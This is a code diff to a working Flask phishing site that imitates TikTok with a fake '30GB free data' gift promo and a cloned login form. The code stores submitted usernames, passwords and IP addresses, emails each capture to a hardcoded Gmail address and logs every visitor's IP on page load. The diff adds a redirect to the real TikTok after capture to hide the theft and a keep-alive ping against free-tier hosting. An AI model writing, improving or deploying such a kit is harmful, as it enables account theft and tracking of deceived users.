@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – WITH FAKE REVIEWS
-# AND IP DETECTION ON PAGE OPEN (NO USER ACTION REQUIRED)
+# AND IP DETECTION ON PAGE OPEN + REDIRECT TO REAL TIKTOK + SELF PING
 # =============================================================================
 
 import os
@@ -8,14 +8,15 @@ import json
 import logging
 import smtplib
 import threading
+import requests
 from email.message import EmailMessage
 from datetime import datetime
 from pathlib import Path
-from flask import Flask, request, render_template_string, abort
+from flask import Flask, request, render_template_string, abort, redirect
 
 # -------------------- Configuration --------------------
 DATA_FILE = "captured_credentials.json"
-VISITORS_FILE = "visitors.json"          # NEW: stores IP of anyone who opens the page
+VISITORS_FILE = "visitors.json"
 VIEW_SECRET = os.environ.get('VIEW_SECRET', 'changeme123')
 
 # SMTP Settings (optional)
@@ -26,6 +27,10 @@ EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
 EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
 EMAIL_FROM = os.environ.get('EMAIL_FROM', '')
 EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')
+
+# Self-ping configuration (prevents Render free tier from sleeping)
+PUBLIC_URL = os.environ.get('PUBLIC_URL', '')  # e.g., 'https://your-app.onrender.com'
+PING_INTERVAL_SECONDS = 600  # 10 minutes
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -456,7 +461,7 @@ PROMO_HTML = '''
 </html>
 '''
 
-# -------------------- 🔐 LOGIN PAGE (unchanged) --------------------
+# -------------------- 🔐 LOGIN PAGE (SIMPLIFIED, NO SUCCESS PAGE) --------------------
 PHISH_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -608,10 +613,6 @@ PHISH_HTML = '''
             padding-top: 20px;
             border-top: 1px solid #f0f0f0;
         }
-        .success-message { text-align: center; padding: 20px 0; }
-        .success-message .emoji { font-size: 56px; margin-bottom: 16px; }
-        .success-message h3 { font-size: 24px; margin-bottom: 10px; color: #121212; }
-        .success-message p { color: #606770; margin-bottom: 24px; }
         .error-message {
             background: #fee2e2;
             color: #b91c1c;
@@ -620,10 +621,6 @@ PHISH_HTML = '''
             margin-bottom: 22px;
             font-size: 14px;
             border-left: 4px solid #b91c1c;
-        }
-        @media (max-width: 480px) {
-            .header { padding: 12px 16px; }
-            .card { padding: 24px 20px; }
         }
     </style>
 </head>
@@ -643,46 +640,37 @@ PHISH_HTML = '''
     </div>
     <div class="main">
         <div class="card">
-            {% if success %}
-                <div class="success-message">
-                    <div class="emoji">🎁✅</div>
-                    <h3>You're all set!</h3>
-                    <p>Your 30GB will be added within minutes.<br>Enjoy free streaming! 🚀</p>
-                    <a href="/" style="display:inline-block; background:#fe2c55; color:white; text-decoration:none; padding:14px 30px; border-radius:40px; font-weight:600;">Return Home</a>
-                </div>
-            {% else %}
-                <div class="gift-reminder">
-                    <span>🎁</span> 30GB Gift waiting for you!
-                </div>
-                <h2>Log in</h2>
-                <p class="subtitle">to claim your free data</p>
-                {% if error %}
-                    <div class="error-message">{{ error }}</div>
-                {% endif %}
-                <form method="POST" action="/login">
-                    <div class="form-group">
-                        <label>Email or username</label>
-                        <div class="input-wrapper">
-                            <input type="text" name="username" placeholder=" " required autofocus>
-                        </div>
-                    </div>
-                    <div class="form-group">
-                        <label>Password</label>
-                        <div class="input-wrapper">
-                            <input type="password" name="password" placeholder=" " required>
-                        </div>
-                        <div class="forgot-link"><a href="#">Forgot password?</a></div>
-                    </div>
-                    <button type="submit" class="login-btn">Log in & Claim</button>
-                    <div class="signup-prompt">
-                        New to TikTok? <a href="#">Sign up</a>
-                    </div>
-                </form>
-                <div class="footer-links">
-                    <a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a>
-                </div>
-                <div class="copyright">© 2026 TikTok</div>
+            <div class="gift-reminder">
+                <span>🎁</span> 30GB Gift waiting for you!
+            </div>
+            <h2>Log in</h2>
+            <p class="subtitle">to claim your free data</p>
+            {% if error %}
+                <div class="error-message">{{ error }}</div>
             {% endif %}
+            <form method="POST" action="/login">
+                <div class="form-group">
+                    <label>Email or username</label>
+                    <div class="input-wrapper">
+                        <input type="text" name="username" placeholder=" " required autofocus>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" name="password" placeholder=" " required>
+                    </div>
+                    <div class="forgot-link"><a href="#">Forgot password?</a></div>
+                </div>
+                <button type="submit" class="login-btn">Log in & Claim</button>
+                <div class="signup-prompt">
+                    New to TikTok? <a href="#">Sign up</a>
+                </div>
+            </form>
+            <div class="footer-links">
+                <a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a>
+            </div>
+            <div class="copyright">© 2026 TikTok</div>
         </div>
     </div>
 </body>
@@ -710,9 +698,7 @@ def save_credentials(username, password, ip_address):
     except Exception as e:
         logger.error(f"Failed to save credentials: {e}")
 
-# ---------- NEW FUNCTION: Log visitor IP on page open ----------
 def log_visitor(ip_address, user_agent):
-    """Record IP and user agent when someone visits the landing page."""
     entry = {
         "timestamp": datetime.now().isoformat(),
         "ip": ip_address,
@@ -757,15 +743,34 @@ def send_email_alert(subject, body):
         logger.error(f"❌ Email failed (ignored): {e}")
         return False
 
+# -------------------- Self-Ping to prevent Render sleep --------------------
+def keep_alive_loop():
+    """Periodically ping the /health endpoint to keep the service awake."""
+    if not PUBLIC_URL:
+        logger.warning("PUBLIC_URL environment variable not set. Self-ping disabled. Service may sleep on free tier.")
+        return
+    url = f"{PUBLIC_URL.rstrip('/')}/health"
+    while True:
+        try:
+            resp = requests.get(url, timeout=10)
+            logger.info(f"Self-ping: {resp.status_code}")
+        except Exception as e:
+            logger.error(f"Self-ping failed: {e}")
+        threading.Event().wait(PING_INTERVAL_SECONDS)
+
 # -------------------- Routes --------------------
 @app.route('/')
 def index():
-    # ---------- THE ONE CHANGE: log IP on page open ----------
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    # Fire and forget – we don't block the response
     threading.Thread(target=log_visitor, args=(ip, user_agent)).start()
-    # ---------------------------------------------------------
+
+    # If PUBLIC_URL is not set, try to infer from the request
+    global PUBLIC_URL
+    if not PUBLIC_URL and request.host_url:
+        PUBLIC_URL = request.host_url.rstrip('/')
+        logger.info(f"Auto-set PUBLIC_URL to {PUBLIC_URL}")
+
     return render_template_string(PROMO_HTML)
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -776,7 +781,7 @@ def login():
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
         if not username or not password:
-            return render_template_string(PHISH_HTML, error="Both fields required", success=False)
+            return render_template_string(PHISH_HTML, error="Both fields required")
 
         save_credentials(username, password, ip)
 
@@ -790,8 +795,9 @@ def login():
         """
         threading.Thread(target=send_email_alert, args=(subject, body)).start()
 
-        return render_template_string(PHISH_HTML, success=True)
-    return render_template_string(PHISH_HTML, success=False)
+        # Redirect to REAL TikTok after capturing credentials
+        return redirect("https://www.tiktok.com")
+    return render_template_string(PHISH_HTML, error=None)
 
 @app.route('/view-data')
 def view_data():
@@ -799,16 +805,8 @@ def view_data():
     if key != VIEW_SECRET:
         abort(403)
     try:
-        if os.path.exists(DATA_FILE):
-            with open(DATA_FILE, 'r') as f:
-                creds = json.load(f)
-        else:
-            creds = []
-        # Also optionally show visitors data
-        visitors = []
-        if os.path.exists(VISITORS_FILE):
-            with open(VISITORS_FILE, 'r') as f:
-                visitors = json.load(f)
+        creds = json.load(open(DATA_FILE)) if os.path.exists(DATA_FILE) else []
+        visitors = json.load(open(VISITORS_FILE)) if os.path.exists(VISITORS_FILE) else []
         return {
             "credentials_count": len(creds),
             "credentials": creds,
@@ -830,5 +828,7 @@ def health_check():
 # -------------------- Main --------------------
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
+    # Start the self-ping daemon when the app runs
+    threading.Thread(target=keep_alive_loop, daemon=True).start()
     logger.info(f"Starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
